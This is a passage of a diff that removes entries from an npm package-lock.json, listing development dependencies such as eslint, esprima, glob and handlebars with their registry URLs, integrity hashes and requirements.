""es5-ext"": ""0.10.42""<c><\n>-        ""es6-symbol"": ""3.1.1""<\n>-      }<\n>-    }<c><\n>-    ""es6-map"": {<\n>-      ""version"": ""0.1.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-map/-/es6-map-0.1.5.tgz""<c><\n>-      ""integrity"": ""sha1-kTbgUD3MBqMBaQ8LsU/042TpSfA=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        ""es5-ext"": ""0.10.42""<c><\n>-        ""es6-iterator"": ""2.0.3""<c><\n>-        ""es6-set"": ""0.1.5""<c><\n>-        ""es6-symbol"": ""3.1.1""<c><\n>-        ""event-emitter"": ""0.3.5""<\n>-      }<\n>-    }<c><\n>-    ""es6-promise"": {<\n>-      ""version"": ""3.3.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-promise/-/es6-promise-3.3.1.tgz""<c><\n>-      ""integrity"": ""sha1-oIzd6EzNvzTQJ6FFG8kdS80ophM=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""es6-set"": {<\n>-      ""version"": ""0.1.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-set/-/es6-set-0.1.5.tgz""<c><\n>-      ""integrity"": ""sha1-0rPsXU2ADO2BjbU40ol02wpzzLE=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        ""es5-ext"": ""0.10.42""<c><\n>-        ""es6-iterator"": ""2.0.3""<c><\n>-        ""es6-symbol"": ""3.1.1""<c><\n>-        ""event-emitter"": ""0.3.5""<\n>-      }<\n>-    }<c><\n>-    ""es6-symbol"": {<\n>-      ""version"": ""3.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-symbol/-/es6-symbol-3.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-vwDvT9q2uhtG7Le2KbTH7VcVzHc=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        ""es5-ext"": ""0.10.42""<\n>-      }<\n>-    }<c><\n>-    ""es6-weak-map"": {<\n>-      ""version"": ""2.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/es6-weak-map/-/es6-weak-map-2.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-XjqzIlH/0VOKH45f+hNXdy+S2W8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        ""es5-ext"": ""0.10.42""<c><\n>-        ""es6-iterator"": ""2.0.3""<c><\n>-        ""es6-symbol"": ""3.1.1""<\n>-      }<\n>-    }<c><\n>-    ""escape-string-regexp"": {<\n>-      ""version"": ""1.0.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/escape-string-regexp/-/escape-string-regexp-1.0.5.tgz""<c><\n>-      ""integrity"": ""sha1-G2HAViGQqN/2rjuyzwIAyhMLhtQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""escodegen"": {<\n>-      ""version"": ""1.8.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/escodegen/-/escodegen-1.8.1.tgz""<c><\n>-      ""integrity"": ""sha1-WltTr0aTEQvrsIZ6o0MN07cKEBg=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""esprima"": ""2.7.3""<c><\n>-        ""estraverse"": ""1.9.3""<c><\n>-        ""esutils"": ""2.0.2""<c><\n>-        ""optionator"": ""0.8.2""<c><\n>-        ""source-map"": ""0.2.0""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""esprima"": {<\n>-          ""version"": ""2.7.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/esprima/-/esprima-2.7.3.tgz""<c><\n>-          ""integrity"": ""sha1-luO3DVd59q1JzQMmc9HDEnZ7pYE=""<c><\n>-          ""dev"": true<\n>-        }<c><\n>-        ""estraverse"": {<\n>-          ""version"": ""1.9.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/estraverse/-/estraverse-1.9.3.tgz""<c><\n>-          ""integrity"": ""sha1-r2fy3JIlgkFZUJJgkaQAXSnJu0Q=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""escope"": {<\n>-      ""version"": ""3.6.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/escope/-/escope-3.6.0.tgz""<c><\n>-      ""integrity"": ""sha1-4Bl16BJ4GhY6ba392AOY3GTIicM=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""es6-map"": ""0.1.5""<c><\n>-        ""es6-weak-map"": ""2.0.2""<c><\n>-        ""esrecurse"": ""4.2.1""<c><\n>-        ""estraverse"": ""4.2.0""<\n>-      }<\n>-    }<c><\n>-    ""eslint"": {<\n>-      ""version"": ""3.19.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/eslint/-/eslint-3.19.0.tgz""<c><\n>-      ""integrity"": ""sha1-yPxiAcf0DdCJQbh8CFdnOGpnmsw=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""babel-code-frame"": ""6.26.0""<c><\n>-        ""chalk"": ""1.1.3""<c><\n>-        ""concat-stream"": ""1.6.2""<c><\n>-        ""debug"": ""2.6.9""<c><\n>-        ""doctrine"": ""2.1.0""<c><\n>-        ""escope"": ""3.6.0""<c><\n>-        ""espree"": ""3.5.4""<c><\n>-        ""esquery"": ""1.0.1""<c><\n>-        ""estraverse"": ""4.2.0""<c><\n>-        ""esutils"": ""2.0.2""<c><\n>-        ""file-entry-cache"": ""2.0.0""<c><\n>-        ""glob"": ""7.1.2""<c><\n>-        ""globals"": ""9.18.0""<c><\n>-        ""ignore"": ""3.3.8""<c><\n>-        ""imurmurhash"": ""0.1.4""<c><\n>-        ""inquirer"": ""0.12.0""<c><\n>-        ""is-my-json-valid"": ""2.17.2""<c><\n>-        ""is-resolvable"": ""1.1.0""<c><\n>-        ""js-yaml"": ""3.11.0""<c><\n>-        ""json-stable-stringify"": ""1.0.1""<c><\n>-        ""levn"": ""0.3.0""<c><\n>-        ""lodash"": ""4.17.10""<c><\n>-        ""mkdirp"": ""0.5.1""<c><\n>-        ""natural-compare"": ""1.4.0""<c><\n>-        ""optionator"": ""0.8.2""<c><\n>-        ""path-is-inside"": ""1.0.2""<c><\n>-        ""pluralize"": ""1.2.1""<c><\n>-        ""progress"": ""1.1.8""<c><\n>-        ""require-uncached"": ""1.0.3""<c><\n>-        ""shelljs"": ""0.7.8""<c><\n>-        ""strip-bom"": ""3.0.0""<c><\n>-        ""strip-json-comments"": ""2.0.1""<c><\n>-        ""table"": ""3.8.3""<c><\n>-        ""text-table"": ""0.2.0""<c><\n>-        ""user-home"": ""2.0.0""<\n>-      }<\n>-    }<c><\n>-    ""eslint-config-eslint"": {<\n>-      ""version"": ""4.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/eslint-config-eslint/-/eslint-config-eslint-4.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-pGOpZiHkyKgOqR60wHh7ujoPe+s=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""js-yaml"": ""3.11.0""<\n>-      }<\n>-    }<c><\n>-    ""eslint-release"": {<\n>-      ""version"": ""0.11.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/eslint-release/-/eslint-release-0.11.1.tgz""<c><\n>-      ""integrity"": ""sha512-y3UVbkwicvB8jySfD2IZ9l6f5TDs6yq9OLC0FFMwySOdbMCkiHXfzNP5jbPQ4+FeMLKhJXX3IF9MsmW5KNlA9A==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""dateformat"": ""1.0.12""<c><\n>-        ""github-api"": ""2.3.0""<c><\n>-        ""linefix"": ""0.1.1""<c><\n>-        ""npm-license"": ""0.3.3""<c><\n>-        ""semver"": ""5.5.0""<c><\n>-        ""shelljs"": ""0.5.3""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""shelljs"": {<\n>-          ""version"": ""0.5.3""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/shelljs/-/shelljs-0.5.3.tgz""<c><\n>-          ""integrity"": ""sha1-xUmCuZbHbvDB5rWfvcWCX1txMRM=""<c><\n>-          ""dev"": true<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""espree"": {<\n>-      ""version"": ""3.5.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/espree/-/espree-3.5.4.tgz""<c><\n>-      ""integrity"": ""sha512-yAcIQxtmMiB/jL32dzEp2enBeidsB7xWPLNiw3IIkpVds1P+h7qF9YwJq1yUNzp2OKXgAprs4F61ih66UsoD1A==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""acorn"": ""5.5.3""<c><\n>-        ""acorn-jsx"": ""3.0.1""<\n>-      }<\n>-    }<c><\n>-    ""esprima"": {<\n>-      ""version"": ""4.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/esprima/-/esprima-4.0.0.tgz""<c><\n>-      ""integrity"": ""sha512-oftTcaMu/EGrEIu904mWteKIv8vMuOgGYo7EhVJJN00R/EED9DCua/xxHRdYnKtcECzVg7xOWhflvJMnqcFZjw==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""esquery"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/esquery/-/esquery-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha512-SmiyZ5zIWH9VM+SRUReLS5Q8a7GxtRdxEBVZpm98rJM7Sb+A9DVCndXfkeFUd3byderg+EbDkfnevfCwynWaNA==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""estraverse"": ""4.2.0""<\n>-      }<\n>-    }<c><\n>-    ""esrecurse"": {<\n>-      ""version"": ""4.2.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/esrecurse/-/esrecurse-4.2.1.tgz""<c><\n>-      ""integrity"": ""sha512-64RBB++fIOAXPw3P9cy89qfMlvZEXZkqqJkjqqXIvzP5ezRZjW+lPWjw35UX/3EhUPFYbg5ER4JYgDw4007/DQ==""<c><\n>-      ""requires"": {<\n>-        ""estraverse"": ""4.2.0""<\n>-      }<\n>-    }<c><\n>-    ""estraverse"": {<\n>-      ""version"": ""4.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/estraverse/-/estraverse-4.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-De4/7TH81GlhjOc0IJn8GvoL2xM=""<\n>-    }<c><\n>-    ""esutils"": {<\n>-      ""version"": ""2.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/esutils/-/esutils-2.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-Cr9PHKpbyx96nYrMbepPqqBLrJs=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""event-emitter"": {<\n>-      ""version"": ""0.3.5""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/event-emitter/-/event-emitter-0.3.5.tgz""<c><\n>-      ""integrity"": ""sha1-34xp7vFkeSPHFXuc6DhAYQsCzDk=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""d"": ""1.0.0""<c><\n>-        ""es5-ext"": ""0.10.42""<\n>-      }<\n>-    }<c><\n>-    ""exit-hook"": {<\n>-      ""version"": ""1.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/exit-hook/-/exit-hook-1.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-8FyiM7SMBdVP/wd2XfhQfpXAL/g=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""fast-levenshtein"": {<\n>-      ""version"": ""2.0.6""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/fast-levenshtein/-/fast-levenshtein-2.0.6.tgz""<c><\n>-      ""integrity"": ""sha1-PYpcZog6FqMMqGQ+hR8Zuqd5eRc=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""figures"": {<\n>-      ""version"": ""1.7.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/figures/-/figures-1.7.0.tgz""<c><\n>-      ""integrity"": ""sha1-y+Hjr/zxzUS4DK3+0o3Hk6lwHS4=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""escape-string-regexp"": ""1.0.5""<c><\n>-        ""object-assign"": ""4.1.1""<\n>-      }<\n>-    }<c><\n>-    ""file-entry-cache"": {<\n>-      ""version"": ""2.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/file-entry-cache/-/file-entry-cache-2.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-w5KZDD5oR4PYOLjISkXYoEhFg2E=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""flat-cache"": ""1.3.0""<c><\n>-        ""object-assign"": ""4.1.1""<\n>-      }<\n>-    }<c><\n>-    ""find-up"": {<\n>-      ""version"": ""1.1.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/find-up/-/find-up-1.1.2.tgz""<c><\n>-      ""integrity"": ""sha1-ay6YIrGizgpgq2TWEOzK1TyyTQ8=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""path-exists"": ""2.1.0""<c><\n>-        ""pinkie-promise"": ""2.0.1""<\n>-      }<\n>-    }<c><\n>-    ""flat-cache"": {<\n>-      ""version"": ""1.3.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/flat-cache/-/flat-cache-1.3.0.tgz""<c><\n>-      ""integrity"": ""sha1-0wMLMrOBVPTjt+nHCfSQ9++XxIE=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""circular-json"": ""0.3.3""<c><\n>-        ""del"": ""2.2.2""<c><\n>-        ""graceful-fs"": ""4.1.11""<c><\n>-        ""write"": ""0.2.1""<\n>-      }<\n>-    }<c><\n>-    ""follow-redirects"": {<\n>-      ""version"": ""0.0.7""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/follow-redirects/-/follow-redirects-0.0.7.tgz""<c><\n>-      ""integrity"": ""sha1-NLkLqyqRGqNHVx2pDyK9NuzYqRk=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""debug"": ""2.6.9""<c><\n>-        ""stream-consume"": ""0.1.1""<\n>-      }<\n>-    }<c><\n>-    ""fs.realpath"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/fs.realpath/-/fs.realpath-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-FQStJSMVjKpA20onh8sBQRmU6k8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""generate-function"": {<\n>-      ""version"": ""2.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/generate-function/-/generate-function-2.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-aFj+fAlpt9TpCTM3ZHrHn2DfvnQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""generate-object-property"": {<\n>-      ""version"": ""1.2.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/generate-object-property/-/generate-object-property-1.2.0.tgz""<c><\n>-      ""integrity"": ""sha1-nA4cQDCM6AT0eDYYuTf6iPmdUNA=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""is-property"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""get-stdin"": {<\n>-      ""version"": ""4.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/get-stdin/-/get-stdin-4.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-uWjGsKBDhDJJAui/Gl3zJXmkUP4=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""github-api"": {<\n>-      ""version"": ""2.3.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/github-api/-/github-api-2.3.0.tgz""<c><\n>-      ""integrity"": ""sha1-7udoRgsp6G6RuWqeefhVXO9rUyU=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""axios"": ""0.10.0""<c><\n>-        ""debug"": ""2.6.9""<c><\n>-        ""es6-promise"": ""3.3.1""<c><\n>-        ""js-base64"": ""2.4.3""<c><\n>-        ""utf8"": ""2.1.2""<\n>-      }<\n>-    }<c><\n>-    ""glob"": {<\n>-      ""version"": ""7.1.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/glob/-/glob-7.1.2.tgz""<c><\n>-      ""integrity"": ""sha512-MJTUg1kjuLeQCJ+ccE4Vpa6kKVXkPYJ2mOCQyUuKLcLQsdrMCpBPUi8qVE6+YuaJkozeA9NusTAw3hLr8Xe5EQ==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""fs.realpath"": ""1.0.0""<c><\n>-        ""inflight"": ""1.0.6""<c><\n>-        ""inherits"": ""2.0.3""<c><\n>-        ""minimatch"": ""3.0.4""<c><\n>-        ""once"": ""1.4.0""<c><\n>-        ""path-is-absolute"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""globals"": {<\n>-      ""version"": ""9.18.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/globals/-/globals-9.18.0.tgz""<c><\n>-      ""integrity"": ""sha512-S0nG3CLEQiY/ILxqtztTWH/3iRRdyBLw6KMDxnKMchrtbj2OFmehVh0WUCfW3DUrIgx/qFrJPICrq4Z4sTR9UQ==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""globby"": {<\n>-      ""version"": ""5.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/globby/-/globby-5.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-69hGZ8oNuzMLmbz8aOrCvFQ3Dg0=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""array-union"": ""1.0.2""<c><\n>-        ""arrify"": ""1.0.1""<c><\n>-        ""glob"": ""7.1.2""<c><\n>-        ""object-assign"": ""4.1.1""<c><\n>-        ""pify"": ""2.3.0""<c><\n>-        ""pinkie-promise"": ""2.0.1""<\n>-      }<\n>-    }<c><\n>-    ""graceful-fs"": {<\n>-      ""version"": ""4.1.11""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/graceful-fs/-/graceful-fs-4.1.11.tgz""<c><\n>-      ""integrity"": ""sha1-Dovf5NHduIVNZOBOp8AOKgJuVlg=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""graceful-readlink"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/graceful-readlink/-/graceful-readlink-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-TK+tdrxi8C+gObL5Tpo906ORpyU=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""growl"": {<\n>-      ""version"": ""1.9.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/growl/-/growl-1.9.2.tgz""<c><\n>-      ""integrity"": ""sha1-Dqd0NxXbjY3ixe3hd14bRayFwC8=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""handlebars"": {<\n>-      ""version"": ""4.0.11""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/handlebars/-/handlebars-4.0.11.tgz""<c><\n>-      ""integrity"": ""sha1-Ywo13+ApS8KB7a5v/F0yn8eYLcw=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""async"": ""1.5.2""<c><\n>-        ""optimist"": ""0.6.1""<c><\n>-        ""source-map"": ""0.4.4""<c><\n>-        ""uglify-js"": ""2.8.29""<\n>-      }<c><\n>-      ""dependencies"": {<\n>-        ""source-map"": {<\n>-          ""version"": ""0.4.4""<c><\n>-          ""resolved"": ""https://registry.npmjs.org/source-map/-/source-map-0.4.4.tgz""<c><\n>-          ""integrity"": ""sha1-66T12pwNyZneaAMti092FzZSA2s=""<c><\n>-          ""dev"": true<c><\n>-          ""requires"": {<\n>-            ""amdefine"": ""1.0.1""<\n>-          }<\n>-        }<\n>-      }<\n>-    }<c><\n>-    ""has-ansi"": {<\n>-      ""version"": ""2.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/has-ansi/-/has-ansi-2.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-NPUEnOHs3ysGSa8+8k5F7TVBbZE=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""ansi-regex"": ""2.1.1""<\n>-      }<\n>-    }<c><\n>-    ""has-flag"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/has-flag/-/has-flag-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-nZ55MWXOAXoA8AQYxD+UKnsdEfo=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""he"": {<\n>-      ""version"": ""1.1.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/he/-/he-1.1.1.tgz""<c><\n>-      ""integrity"": ""sha1-k0EP0hsAlzUVH4howvJx80J+I/0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""hosted-git-info"": {<\n>-      ""version"": ""2.6.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/hosted-git-info/-/hosted-git-info-2.6.0.tgz""<c><\n>-      ""integrity"": ""sha512-lIbgIIQA3lz5XaB6vxakj6sDHADJiZadYEJB+FgA+C4nubM1NwcuvUr9EJPmnH1skZqpqUzWborWo8EIUi0Sdw==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""ignore"": {<\n>-      ""version"": ""3.3.8""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/ignore/-/ignore-3.3.8.tgz""<c><\n>-      ""integrity"": ""sha512-pUh+xUQQhQzevjRHHFqqcTy0/dP/kS9I8HSrUydhihjuD09W6ldVWFtIrwhXdUJHis3i2rZNqEHpZH/cbinFbg==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""imurmurhash"": {<\n>-      ""version"": ""0.1.4""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/imurmurhash/-/imurmurhash-0.1.4.tgz""<c><\n>-      ""integrity"": ""sha1-khi5srkoojixPcT7a21XbyMUU+o=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""indent-string"": {<\n>-      ""version"": ""2.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/indent-string/-/indent-string-2.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-ji1INIdCEhtKghi3oTfppSBJ3IA=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""repeating"": ""2.0.1""<\n>-      }<\n>-    }<c><\n>-    ""inflight"": {<\n>-      ""version"": ""1.0.6""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/inflight/-/inflight-1.0.6.tgz""<c><\n>-      ""integrity"": ""sha1-Sb1jMdfQLQwJvJEKEHW6gWW1bfk=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""once"": ""1.4.0""<c><\n>-        ""wrappy"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""inherits"": {<\n>-      ""version"": ""2.0.3""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/inherits/-/inherits-2.0.3.tgz""<c><\n>-      ""integrity"": ""sha1-Yzwsg+PaQqUC9SRmAiSA9CCCYd4=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""inquirer"": {<\n>-      ""version"": ""0.12.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/inquirer/-/inquirer-0.12.0.tgz""<c><\n>-      ""integrity"": ""sha1-HvK/1jUE3wvHV4X/+MLEHfEvB34=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""ansi-escapes"": ""1.4.0""<c><\n>-        ""ansi-regex"": ""2.1.1""<c><\n>-        ""chalk"": ""1.1.3""<c><\n>-        ""cli-cursor"": ""1.0.2""<c><\n>-        ""cli-width"": ""2.2.0""<c><\n>-        ""figures"": ""1.7.0""<c><\n>-        ""lodash"": ""4.17.10""<c><\n>-        ""readline2"": ""1.0.1""<c><\n>-        ""run-async"": ""0.1.0""<c><\n>-        ""rx-lite"": ""3.1.2""<c><\n>-        ""string-width"": ""1.0.2""<c><\n>-        ""strip-ansi"": ""3.0.1""<c><\n>-        ""through"": ""2.3.8""<\n>-      }<\n>-    }<c><\n>-    ""interpret"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/interpret/-/interpret-1.1.0.tgz""<c><\n>-      ""integrity"": ""sha1-ftGxQQxqDg94z5XTuEQMY/eLhhQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-arrayish"": {<\n>-      ""version"": ""0.2.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-arrayish/-/is-arrayish-0.2.1.tgz""<c><\n>-      ""integrity"": ""sha1-d8mYQFJ6qOyxqLppe4BkWnqSap0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-buffer"": {<\n>-      ""version"": ""1.1.6""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-buffer/-/is-buffer-1.1.6.tgz""<c><\n>-      ""integrity"": ""sha512-NcdALwpXkTm5Zvvbk7owOUSvVvBKDgKP5/ewfXEznmQFfs4ZRmanOeKBTjRVjka3QFoN6XJ+9F3USqfHqTaU5w==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-builtin-module"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-builtin-module/-/is-builtin-module-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-VAVy0096wxGfj3bDDLwbHgN6/74=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""builtin-modules"": ""1.1.1""<\n>-      }<\n>-    }<c><\n>-    ""is-finite"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-finite/-/is-finite-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-zGZ3aVYCvlUO8R6LSqYwU0K20Ko=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""number-is-nan"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""is-fullwidth-code-point"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-fullwidth-code-point/-/is-fullwidth-code-point-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-754xOG8DGn8NZDr4L95QxFfvAMs=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""number-is-nan"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""is-my-ip-valid"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-my-ip-valid/-/is-my-ip-valid-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha512-gmh/eWXROncUzRnIa1Ubrt5b8ep/MGSnfAUI3aRp+sqTCs1tv1Isl8d8F6JmkN3dXKc3ehZMrtiPN9eL03NuaQ==""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-my-json-valid"": {<\n>-      ""version"": ""2.17.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-my-json-valid/-/is-my-json-valid-2.17.2.tgz""<c><\n>-      ""integrity"": ""sha512-IBhBslgngMQN8DDSppmgDv7RNrlFotuuDsKcrCP3+HbFaVivIBU7u9oiiErw8sH4ynx3+gOGQ3q2otkgiSi6kg==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""generate-function"": ""2.0.0""<c><\n>-        ""generate-object-property"": ""1.2.0""<c><\n>-        ""is-my-ip-valid"": ""1.0.0""<c><\n>-        ""jsonpointer"": ""4.0.1""<c><\n>-        ""xtend"": ""4.0.1""<\n>-      }<\n>-    }<c><\n>-    ""is-path-cwd"": {<\n>-      ""version"": ""1.0.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-path-cwd/-/is-path-cwd-1.0.0.tgz""<c><\n>-      ""integrity"": ""sha1-0iXsIxMuie3Tj9p2dHLmLmXxEG0=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-path-in-cwd"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-path-in-cwd/-/is-path-in-cwd-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha512-FjV1RTW48E7CWM7eE/J2NJvAEEVektecDBVBE5Hh3nM1Jd0kvhHtX68Pr3xsDf857xt3Y4AkwVULK1Vku62aaQ==""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""is-path-inside"": ""1.0.1""<\n>-      }<\n>-    }<c><\n>-    ""is-path-inside"": {<\n>-      ""version"": ""1.0.1""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-path-inside/-/is-path-inside-1.0.1.tgz""<c><\n>-      ""integrity"": ""sha1-jvW33lBDej/cprToZe96pVy0gDY=""<c><\n>-      ""dev"": true<c><\n>-      ""requires"": {<\n>-        ""path-is-inside"": ""1.0.2""<\n>-      }<\n>-    }<c><\n>-    ""is-property"": {<\n>-      ""version"": ""1.0.2""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-property/-/is-property-1.0.2.tgz""<c><\n>-      ""integrity"": ""sha1-V/4cTkhHTt1lsJkR8msc1Ald2oQ=""<c><\n>-      ""dev"": true<\n>-    }<c><\n>-    ""is-resolvable"": {<\n>-      ""version"": ""1.1.0""<c><\n>-      ""resolved"": ""https://registry.npmjs.org/is-resolvable/-/is-resolvable-1.1.0.tgz""<c><\n>-      ""integrity"": 